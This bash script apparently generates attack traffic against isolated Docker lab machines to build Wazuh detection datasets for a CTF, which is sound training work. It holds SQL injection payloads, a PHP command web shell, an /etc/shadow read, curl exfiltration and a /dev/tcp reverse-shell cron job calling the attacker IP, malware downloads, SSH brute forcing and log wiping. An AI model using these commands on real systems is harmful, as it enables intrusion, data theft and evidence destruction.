#!/usr/bin/env bash
# ==============================================================================
# WazuhBOTS -- Attack Generation Script
#
# Generates realistic attack traffic against the WazuhBOTS victim machines
# so that Wazuh can collect, decode, and index the resulting alerts. These
# alerts form the datasets that CTF participants investigate.
#
# IMPORTANT: This script is intended to run INSIDE the WazuhBOTS Docker
# network (e.g., from the caldera container or a dedicated attacker
# container). It can also run from the host if the victim IPs are reachable.
#
# Usage:
#   ./scripts/generate_attacks.sh --scenario 1     # Scenario 1: Dark Harvest
#   ./scripts/generate_attacks.sh --scenario 2     # Scenario 2: Iron Gate
#   ./scripts/generate_attacks.sh --scenario 3     # Scenario 3: Ghost in the Shell
#   ./scripts/generate_attacks.sh --scenario all    # All scenarios sequentially
#   ./scripts/generate_attacks.sh --baseline        # Generate baseline traffic only
#   ./scripts/generate_attacks.sh --dry-run         # Print commands without executing
#
# Prerequisites:
#   nmap, curl, nikto, hydra, sqlmap (install via: apt install nmap nikto hydra)
#
# Author: MrHacker (Kevin Munoz) -- Wazuh Technology Ambassador
# ==============================================================================
set -euo pipefail

# ------------------------------------------------------------------------------
# Color definitions
# ------------------------------------------------------------------------------
BOLD='\033[1m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

# ------------------------------------------------------------------------------
# Target IPs — must match docker-compose.yml network assignments
# ------------------------------------------------------------------------------
WEB_SRV="172.25.0.30"          # web-srv (DVWA + Apache)
LNX_SRV="172.25.0.31"          # lnx-srv (SSH + Linux services)
DC_SRV="${DC_SRV_IP:-172.25.0.32}"  # dc-srv (AD simulation) — if deployed
ATTACKER_IP="172.25.0.100"     # simulated external attacker IP

# Wordlists — adjust paths if running outside Kali/attacker container
ROCKYOU="${ROCKYOU_PATH:-/usr/share/wordlists/rockyou.txt}"
COMMON_USERS="${COMMON_USERS_PATH:-/usr/share/wordlists/metasploit/common_users.txt}"
DIRB_COMMON="${DIRB_COMMON_PATH:-/usr/share/dirb/wordlists/common.txt}"

# ------------------------------------------------------------------------------
# Project paths
# ------------------------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
LOG_DIR="${PROJECT_ROOT}/logs/attacks"

# ------------------------------------------------------------------------------
# CLI flags
# ------------------------------------------------------------------------------
SCENARIO=""
BASELINE=false
DRY_RUN=false

for arg in "$@"; do
    case "${arg}" in
        --scenario)   shift_next=scenario ;;
        --baseline)   BASELINE=true ;;
        --dry-run)    DRY_RUN=true ;;
        --help|-h)
            echo "Usage: $0 [--scenario 1|2|3|all] [--baseline] [--dry-run] [--help]"
            exit 0
            ;;
        *)
            if [[ "${shift_next:-}" == "scenario" ]]; then
                SCENARIO="${arg}"
                shift_next=""
            else
                # Handle --scenario=N format
                if [[ "${arg}" =~ ^--scenario=(.+)$ ]]; then
                    SCENARIO="${BASH_REMATCH[1]}"
                else
                    echo -e "${RED}[!] Unknown option: ${arg}${NC}"
                    exit 1
                fi
            fi
            ;;
    esac
done

# ------------------------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------------------------
log_info()   { echo -e "${CYAN}[*]${NC} $*"; }
log_ok()     { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()   { echo -e "${YELLOW}[!]${NC} $*"; }
log_error()  { echo -e "${RED}[!]${NC} $*"; }
log_attack() { echo -e "${RED}[ATK]${NC} $*"; }
log_step()   { echo -e "\n${BOLD}${CYAN}==> $*${NC}"; }

timestamp() { date -u '+%Y-%m-%dT%H:%M:%SZ'; }

# Execute or print a command depending on dry-run mode
run_cmd() {
    if [[ "${DRY_RUN}" == "true" ]]; then
        echo -e "  ${YELLOW}[DRY-RUN]${NC} $*"
    else
        log_attack "$*"
        eval "$@" 2>&1 | tee -a "${LOG_DIR}/attack_$(date +%Y%m%d).log" || true
    fi
}

# Wait with a message (simulates attacker pausing between phases)
attack_pause() {
    local seconds="${1:-5}"
    local reason="${2:-between attack phases}"
    if [[ "${DRY_RUN}" == "false" ]]; then
        log_info "Pausing ${seconds}s ${reason}..."
        sleep "${seconds}"
    fi
}

# Check if a tool is available
require_tool() {
    local tool="$1"
    if ! command -v "${tool}" &>/dev/null; then
        log_warn "${tool} is not installed. Some attacks will be skipped."
        return 1
    fi
    return 0
}

# ==============================================================================
# Baseline Traffic Generation
# Generates normal, legitimate traffic to create a realistic background
# noise level in the Wazuh alerts. Run this BEFORE attack scenarios.
# ==============================================================================
generate_baseline() {
    log_step "Generating baseline (legitimate) traffic"

    local duration="${1:-60}"  # seconds of baseline traffic
    local end_time=$(( $(date +%s) + duration ))

    log_info "Generating ${duration}s of normal traffic..."

    while [[ $(date +%s) -lt ${end_time} ]]; do
        # Normal HTTP requests to web-srv
        run_cmd "curl -sk -o /dev/null http://${WEB_SRV}/"
        run_cmd "curl -sk -o /dev/null http://${WEB_SRV}/index.php"
        run_cmd "curl -sk -o /dev/null http://${WEB_SRV}/about.php"

        # Normal SSH connection attempt to lnx-srv (will fail, that is fine)
        run_cmd "ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no nobody@${LNX_SRV} exit 2>/dev/null || true"

        # Normal DNS lookups
        run_cmd "dig +short example.com @8.8.8.8 || true"

        # Legitimate curl to external-like URLs (simulates updates)
        run_cmd "curl -sk -o /dev/null https://packages.wazuh.com/4.x/apt/ || true"

        sleep $(( RANDOM % 3 + 1 ))
    done

    log_ok "Baseline traffic generation complete"
}

# ==============================================================================
# SCENARIO 1: "Operation Dark Harvest" -- Web Application Compromise
#
# Kill chain:
#   1. Reconnaissance with Nmap and Nikto
#   2. Directory brute-forcing
#   3. SQL Injection via DVWA
#   4. Web shell upload
#   5. Privilege escalation
#   6. Database dump and exfiltration
#   7. Persistence via cron job
# ==============================================================================
scenario1_dark_harvest() {
    log_step "Scenario 1: Operation Dark Harvest (Web Application Compromise)"
    log_info "Target: ${WEB_SRV} (web-srv)"
    echo ""

    # --- Phase 1: Reconnaissance ---
    log_step "Phase 1: Reconnaissance"

    # Nmap port scan — generates rule 87101 (network scan detected)
    if require_tool nmap; then
        run_cmd "nmap -sS -sV -p 1-1000 -T4 --open ${WEB_SRV}"
        attack_pause 3 "after port scan"
        # Aggressive service/OS detection scan
        run_cmd "nmap -A -p 80,443,3306,22 ${WEB_SRV}"
        attack_pause 5 "after service detection"
    fi

    # Nikto web vulnerability scanner — generates suspicious User-Agent alerts
    if require_tool nikto; then
        run_cmd "nikto -h http://${WEB_SRV} -maxtime 120s -o ${LOG_DIR}/nikto_websrv.txt"
        attack_pause 5 "after Nikto scan"
    fi

    # --- Phase 2: Directory brute-forcing ---
    log_step "Phase 2: Directory Enumeration"

    # Curl-based directory brute force (lightweight alternative to dirb/gobuster)
    local dirs=("admin" "backup" "config" "uploads" "phpmyadmin" "wp-admin"
                "wp-login.php" "administrator" "login" "dashboard" "api"
                "shell" "cmd" "console" "dvwa" "setup.php" "info.php"
                ".git" ".env" "robots.txt" "sitemap.xml")

    for dir in "${dirs[@]}"; do
        run_cmd "curl -sk -o /dev/null -w '%{http_code}' http://${WEB_SRV}/${dir}"
    done
    attack_pause 3 "after directory enumeration"

    # --- Phase 3: SQL Injection ---
    log_step "Phase 3: SQL Injection Attack"

    # Manual SQLi payloads against DVWA (triggers Wazuh web attack rules 31101-31110)
    local sqli_payloads=(
        "1' OR '1'='1"
        "1' OR '1'='1' --"
        "1' UNION SELECT null,null --"
        "1' UNION SELECT user(),database() --"
        "1' UNION SELECT table_name,null FROM information_schema.tables --"
        "1'; DROP TABLE users; --"
        "admin'--"
        "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
    )

    for payload in "${sqli_payloads[@]}"; do
        local encoded
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "${payload}")
        run_cmd "curl -sk -o /dev/null 'http://${WEB_SRV}/dvwa/vulnerabilities/sqli/?id=${encoded}&Submit=Submit' -b 'PHPSESSID=fake; security=low'"
        sleep 1
    done
    attack_pause 5 "after SQL injection"

    # sqlmap automated SQLi (if available)
    if require_tool sqlmap; then
        run_cmd "sqlmap -u 'http://${WEB_SRV}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=fake;security=low' --batch --level=3 --risk=2 --dbs --output-dir=${LOG_DIR}/sqlmap/ || true"
        attack_pause 5 "after sqlmap"
    fi

    # --- Phase 4: Web Shell Upload ---
    log_step "Phase 4: Web Shell Upload"

    # Attempt to upload a PHP web shell (triggers FIM rules 550-553)
    local webshell_content='<?php echo "WAZUHBOTS_SHELL"; if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
    run_cmd "curl -sk -X POST 'http://${WEB_SRV}/dvwa/vulnerabilities/upload/' -F 'uploaded=@-;filename=shell.php;type=application/x-php' -F 'Upload=Upload' -b 'PHPSESSID=fake;security=low' <<< '${webshell_content}'"
    attack_pause 3 "after web shell upload"

    # Attempt to execute commands via the web shell
    local shell_cmds=("id" "whoami" "uname -a" "cat /etc/passwd" "ls -la /var/www" "netstat -tlnp")
    for cmd in "${shell_cmds[@]}"; do
        local encoded_cmd
        encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${cmd}'))" 2>/dev/null || echo "${cmd}")
        run_cmd "curl -sk 'http://${WEB_SRV}/dvwa/hackable/uploads/shell.php?cmd=${encoded_cmd}'"
        sleep 1
    done
    attack_pause 3 "after shell command execution"

    # --- Phase 5: Privilege Escalation ---
    log_step "Phase 5: Privilege Escalation Simulation"

    # These commands would be run inside the container; we simulate via the web shell
    local privesc_cmds=(
        "sudo -l"
        "find / -perm -4000 -type f 2>/dev/null"
        "cat /etc/shadow"
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    )
    for cmd in "${privesc_cmds[@]}"; do
        local encoded_cmd
        encoded_cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${cmd}'''))" 2>/dev/null || echo "${cmd}")
        run_cmd "curl -sk 'http://${WEB_SRV}/dvwa/hackable/uploads/shell.php?cmd=${encoded_cmd}'"
        sleep 1
    done
    attack_pause 3 "after privilege escalation"

    # --- Phase 6: Data Exfiltration ---
    log_step "Phase 6: Database Dump and Exfiltration"

    # MySQL dump via web shell
    run_cmd "curl -sk 'http://${WEB_SRV}/dvwa/hackable/uploads/shell.php?cmd=mysqldump+-u+root+dvwa+--no-tablespaces'"
    attack_pause 2
    # Simulate data exfil to attacker
    run_cmd "curl -sk 'http://${WEB_SRV}/dvwa/hackable/uploads/shell.php?cmd=curl+-X+POST+http://${ATTACKER_IP}:4444/exfil+-d+@/tmp/dump.sql'"
    attack_pause 3 "after data exfiltration"

    # --- Phase 7: Persistence ---
    log_step "Phase 7: Persistence via Cron Job"

    # Install a reverse shell cron job (triggers MITRE T1053.003)
    run_cmd "curl -sk 'http://${WEB_SRV}/dvwa/hackable/uploads/shell.php?cmd=echo+%22*/5+*+*+*+*+/bin/bash+-c+%27bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/4444+0>%261%27%22+|+crontab+-'"
    attack_pause 2

    log_ok "Scenario 1: Dark Harvest -- Attack sequence complete"
    log_info "Timestamp: $(timestamp)"
}

# ==============================================================================
# SCENARIO 2: "Iron Gate" -- Active Directory Compromise (Simulated)
#
# Since we use a container that simulates AD logs rather than a real AD
# environment, this scenario injects simulated Windows Security event
# patterns that the dc-srv log simulator will generate.
#
# Kill chain:
#   1. Spearphishing delivery (simulated email log)
#   2. Macro execution (simulated Sysmon events)
#   3. Credential dumping (Mimikatz patterns)
#   4. Kerberoasting
#   5. Lateral movement (WMI/PSExec patterns)
#   6. Ransomware deployment simulation
# ==============================================================================
scenario2_iron_gate() {
    log_step "Scenario 2: Iron Gate (Active Directory Compromise)"
    log_info "Target: ${DC_SRV} (dc-srv -- AD simulation)"
    echo ""

    # Verify dc-srv is reachable
    if ! run_cmd "curl -sk --max-time 5 -o /dev/null http://${DC_SRV}:8080/health 2>/dev/null"; then
        log_warn "dc-srv may not be running. Triggering log simulation via Docker exec..."
    fi

    # --- Phase 1: Trigger AD log simulation ---
    log_step "Phase 1: Phishing Delivery Simulation"

    # The dc-srv container has ad_log_simulator.py that generates realistic
    # Windows event log entries. We trigger specific attack scenarios via its API
    # or by executing commands inside the container.
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario phishing --user john.doe --attacker-ip ${ATTACKER_IP} || true"
    attack_pause 5 "simulating user opening phishing email"

    # --- Phase 2: Macro Execution ---
    log_step "Phase 2: Malicious Macro Execution"
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario macro_execution --parent-process WINWORD.EXE --child-process powershell.exe || true"
    attack_pause 5 "after macro execution"

    # --- Phase 3: Credential Dumping ---
    log_step "Phase 3: Credential Dumping (Mimikatz Pattern)"
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario credential_dump --tool mimikatz --target-process lsass.exe || true"
    attack_pause 5 "after credential dumping"

    # --- Phase 4: Kerberoasting ---
    log_step "Phase 4: Kerberoasting Attack"
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario kerberoast --spn 'MSSQLSvc/sql-srv.wazuhbots.local:1433' --encryption-type 0x17 || true"
    attack_pause 5 "after kerberoasting"

    # --- Phase 5: Lateral Movement ---
    log_step "Phase 5: Lateral Movement (WMI / PSExec)"
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario lateral_movement --method psexec --source-host WS01 --dest-host DC01 || true"
    attack_pause 5 "after lateral movement"

    # --- Phase 6: Ransomware ---
    log_step "Phase 6: Ransomware Deployment Simulation"
    run_cmd "docker exec wazuhbots-dc-srv python3 /opt/ad_log_simulator.py --scenario ransomware --encryption-ext .locked --ransom-note README_RESTORE.txt || true"
    attack_pause 3

    log_ok "Scenario 2: Iron Gate -- Attack sequence complete"
    log_info "Timestamp: $(timestamp)"
}

# ==============================================================================
# SCENARIO 3: "Ghost in the Shell" -- Linux Server Compromise + Rootkit
#
# Kill chain:
#   1. SSH brute force (thousands of attempts)
#   2. Successful SSH login with compromised credentials
#   3. Download of malicious toolkit
#   4. Rootkit installation simulation
#   5. Reverse shell / C2 channel
#   6. Crypto miner deployment
#   7. Log tampering
# ==============================================================================
scenario3_ghost_shell() {
    log_step "Scenario 3: Ghost in the Shell (Linux Server Compromise)"
    log_info "Target: ${LNX_SRV} (lnx-srv)"
    echo ""

    # --- Phase 1: SSH Brute Force ---
    log_step "Phase 1: SSH Brute Force"

    if require_tool hydra; then
        # Generate a small wordlist for the brute force demonstration
        local tmp_users="/tmp/wazuhbots_users.txt"
        local tmp_pass="/tmp/wazuhbots_pass.txt"

        # Create user/password lists (small for demo; real datasets use larger lists)
        cat > "${tmp_users}" <<'USERS'
root
admin
ubuntu
deploy
sysadmin
operator
testuser
developer
backup
service
USERS

        cat > "${tmp_pass}" <<'PASSWORDS'
password
123456
admin
root
letmein
welcome
password1
qwerty
abc123
monkey
master
dragon
login
WazuhBOTS2026!
P@ssw0rd123
Summer2026!
PASSWORDS

        # Run hydra SSH brute force -- generates massive auth failure logs
        # Wazuh rules 5710, 5712, 5720 will fire
        run_cmd "hydra -L ${tmp_users} -P ${tmp_pass} ssh://${LNX_SRV} -t 4 -w 3 -f -o ${LOG_DIR}/hydra_lnxsrv.txt || true"
        attack_pause 10 "after brute force (letting logs settle)"
    else
        # Fallback: manual SSH attempts via sshpass or plain ssh
        log_info "Hydra not available. Generating manual SSH failures..."
        local passwords=("password" "123456" "admin" "root" "letmein" "P@ssw0rd" "welcome")
        for pass in "${passwords[@]}"; do
            run_cmd "sshpass -p '${pass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@${LNX_SRV} exit 2>/dev/null || true"
            sleep 0.5
        done
        attack_pause 5 "after manual SSH attempts"
    fi

    # --- Phase 2: Successful Login ---
    log_step "Phase 2: Successful SSH Access"
    # Simulates attacker gaining access with valid credentials
    run_cmd "sshpass -p 'WazuhBOTS2026!' ssh -o StrictHostKeyChecking=no deploy@${LNX_SRV} 'echo ACCESS_GRANTED; id; hostname' 2>/dev/null || true"
    attack_pause 3 "after successful login"

    # --- Phase 3: Toolkit Download ---
    log_step "Phase 3: Malicious Toolkit Download"

    # Commands executed inside lnx-srv to simulate toolkit download
    # These trigger Wazuh FIM and command monitoring rules
    local toolkit_cmds=(
        "curl -sk http://${ATTACKER_IP}:8080/toolkit.tar.gz -o /tmp/.toolkit.tar.gz"
        "wget -q http://${ATTACKER_IP}:8080/rootkit.ko -O /tmp/.r00tkit.ko"
        "chmod +x /tmp/.toolkit.tar.gz"
        "tar xzf /tmp/.toolkit.tar.gz -C /tmp/.hidden/"
    )

    for cmd in "${toolkit_cmds[@]}"; do
        run_cmd "docker exec wazuhbots-lnx-srv bash -c '${cmd}' 2>/dev/null || true"
        sleep 1
    done
    attack_pause 3 "after toolkit download"

    # --- Phase 4: Rootkit Installation Simulation ---
    log_step "Phase 4: Rootkit Installation (Simulated)"

    # Simulate kernel module loading (triggers auditd rules)
    local rootkit_cmds=(
        "echo 'Simulating insmod /tmp/.r00tkit.ko' >> /var/log/syslog"
        "touch /lib/modules/\$(uname -r)/kernel/drivers/.hidden_module.ko"
        "echo '.hidden_module' >> /etc/modules"
        "dmesg | tail -5"
    )

    for cmd in "${rootkit_cmds[@]}"; do
        run_cmd "docker exec wazuhbots-lnx-srv bash -c '${cmd}' 2>/dev/null || true"
        sleep 1
    done
    attack_pause 3 "after rootkit simulation"

    # --- Phase 5: Reverse Shell / C2 ---
    log_step "Phase 5: C2 Channel Establishment"

    # Simulate reverse shell setup (the connection will fail, but the
    # commands in logs are what matters for detection)
    local c2_cmds=(
        "bash -c 'echo SIMULATED: bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1'"
        "nohup python3 -c 'import socket,subprocess,os;s=socket.socket();print(\"C2_SIM\")' &>/dev/null &"
        "curl -sk http://${ATTACKER_IP}:8443/beacon -d 'hostname=\$(hostname)&user=\$(whoami)'"
    )

    for cmd in "${c2_cmds[@]}"; do
        run_cmd "docker exec wazuhbots-lnx-srv bash -c '${cmd}' 2>/dev/null || true"
        sleep 1
    done
    attack_pause 3 "after C2 setup"

    # --- Phase 6: Crypto Miner ---
    log_step "Phase 6: Crypto Miner Deployment"

    local miner_cmds=(
        "curl -sk http://${ATTACKER_IP}:8080/xmrig -o /tmp/.xmrig"
        "chmod +x /tmp/.xmrig"
        "echo 'Simulated: /tmp/.xmrig --url pool.minexmr.com:4444 --user WALLET' >> /var/log/syslog"
        "echo '*/10 * * * * /tmp/.xmrig --url pool.minexmr.com:4444' | crontab -"
    )

    for cmd in "${miner_cmds[@]}"; do
        run_cmd "docker exec wazuhbots-lnx-srv bash -c '${cmd}' 2>/dev/null || true"
        sleep 1
    done
    attack_pause 3 "after crypto miner"

    # --- Phase 7: Log Tampering ---
    log_step "Phase 7: Log Tampering (Anti-Forensics)"

    # Attempt to clear/modify logs (Wazuh detects this via FIM and log rules)
    local tamper_cmds=(
        "echo '' > /var/log/auth.log"
        "echo '' > /var/log/syslog"
        "history -c"
        "shred -zu /var/log/wtmp"
        "touch -t 202601010000 /var/log/auth.log"
    )

    for cmd in "${tamper_cmds[@]}"; do
        run_cmd "docker exec wazuhbots-lnx-srv bash -c '${cmd}' 2>/dev/null || true"
        sleep 1
    done

    log_ok "Scenario 3: Ghost in the Shell -- Attack sequence complete"
    log_info "Timestamp: $(timestamp)"
}

# ==============================================================================
# Tool availability check
# ==============================================================================
check_attack_tools() {
    log_step "Checking attack tool availability"

    local tools=("nmap" "nikto" "hydra" "sqlmap" "curl" "python3" "sshpass" "docker")
    local available=0
    local total=${#tools[@]}

    for tool in "${tools[@]}"; do
        if command -v "${tool}" &>/dev/null; then
            log_ok "${tool} is available"
            available=$(( available + 1 ))
        else
            log_warn "${tool} is NOT installed (some attacks will be skipped)"
        fi
    done

    echo ""
    log_info "${available}/${total} attack tools available"

    if [[ "${available}" -lt 3 ]]; then
        log_error "Too few tools available. Install at least: nmap, curl, docker"
        exit 1
    fi
}

# ==============================================================================
# Main
# ==============================================================================
main() {
    echo ""
    echo -e "${BOLD}${RED}"
    cat << 'BANNER'
    ___   ____________   ________ __
   /   | /_  __/_  __/  /  _/ __ \/ /__ ____
  / /| |  / /   / /     / // /_/ / //_// __/
 / ___ | / /   / /    _/ // __, / ,<  _\ \
/_/  |_|/_/   /_/    /___/_/ |_/_/|_|/___/

BANNER
    echo -e "${NC}"
    echo -e "${BOLD}  WazuhBOTS -- Attack Traffic Generator${NC}"
    echo -e "  $(date '+%Y-%m-%d %H:%M:%S %Z')"
    echo ""

    if [[ "${DRY_RUN}" == "true" ]]; then
        echo -e "  ${YELLOW}MODE: DRY RUN (commands will be printed, not executed)${NC}"
        echo ""
    fi

    # Create log directory
    mkdir -p "${LOG_DIR}"

    # Check tools
    check_attack_tools

    if [[ "${BASELINE}" == "true" ]]; then
        generate_baseline 120
        exit 0
    fi

    if [[ -z "${SCENARIO}" ]]; then
        echo ""
        echo "  Usage: $0 --scenario [1|2|3|all]"
        echo ""
        echo "  Scenarios:"
        echo "    1 - Operation Dark Harvest (Web Application Compromise)"
        echo "    2 - Iron Gate (Active Directory Compromise)"
        echo "    3 - Ghost in the Shell (Linux Server Compromise)"
        echo "    all - Run all scenarios sequentially"
        echo ""
        echo "  Other options:"
        echo "    --baseline  Generate legitimate background traffic"
        echo "    --dry-run   Print commands without executing"
        echo ""
        exit 0
    fi

    # Warn the user
    if [[ "${DRY_RUN}" == "false" ]]; then
        echo -e "  ${RED}${BOLD}WARNING: This will generate real attack traffic against the${NC}"
        echo -e "  ${RED}${BOLD}WazuhBOTS lab environment. Only run this in an isolated lab.${NC}"
        echo ""
        read -r -p "  Continue? [y/N] " confirm
        case "${confirm}" in
            [yY]|[yY][eE][sS]) ;;
            *) echo "  Aborted."; exit 0 ;;
        esac
        echo ""
    fi

    # Generate baseline traffic first
    log_info "Generating 30s of baseline traffic before attacks..."
    generate_baseline 30

    # Run selected scenario(s)
    case "${SCENARIO}" in
        1) scenario1_dark_harvest ;;
        2) scenario2_iron_gate ;;
        3) scenario3_ghost_shell ;;
        all|ALL)
            scenario1_dark_harvest
            attack_pause 15 "between scenarios"
            scenario2_iron_gate
            attack_pause 15 "between scenarios"
            scenario3_ghost_shell
            ;;
        *)
            log_error "Unknown scenario: ${SCENARIO}. Use 1, 2, 3, or all."
            exit 1
            ;;
    esac

    # Final summary
    echo ""
    echo -e "${GREEN}${BOLD}================================================================${NC}"
    echo -e "${GREEN}${BOLD}  Attack generation complete!${NC}"
    echo -e "${GREEN}${BOLD}================================================================${NC}"
    echo ""
    echo -e "  Logs saved to: ${CYAN}${LOG_DIR}/${NC}"
    echo ""
    echo -e "  ${BOLD}Next steps:${NC}"
    echo -e "    1. Wait 2-3 minutes for Wazuh to process all events"
    echo -e "    2. Export datasets:  ${CYAN}./scripts/export_datasets.sh${NC}"
    echo -e "    3. Verify alerts in: ${CYAN}https://localhost:5601${NC}"
    echo ""
}

main "$@"
